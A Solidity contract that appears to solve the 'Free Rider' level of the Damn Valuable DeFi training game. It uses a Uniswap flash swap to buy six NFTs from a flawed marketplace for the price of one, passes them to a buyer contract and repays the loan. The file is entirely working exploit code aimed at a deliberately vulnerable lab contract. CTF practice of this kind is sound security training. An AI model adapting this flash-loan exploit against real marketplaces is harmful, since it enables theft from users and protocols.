//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";

contract FreeRider {
    FreeRiderNFTMarketplace marketplace;
    FreeRiderBuyer buyer;
    DamnValuableNFT nft;
    WETH9 weth;

    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _marketplace,
        address _buyer,
        address _nft,
        address payable _weth
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyer = FreeRiderBuyer(_buyer);
        nft = DamnValuableNFT(_nft);
        weth = WETH9(_weth);
    }

    receive() external payable {}

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external {
        weth.withdraw(amount0);
        marketplace.buyMany{value: amount0}(tokenIds);
        for (uint8 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }
        weth.deposit{value: (amount0 * 1000) / 970}();
        weth.transfer(msg.sender, (amount0 * 1000) / 970);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
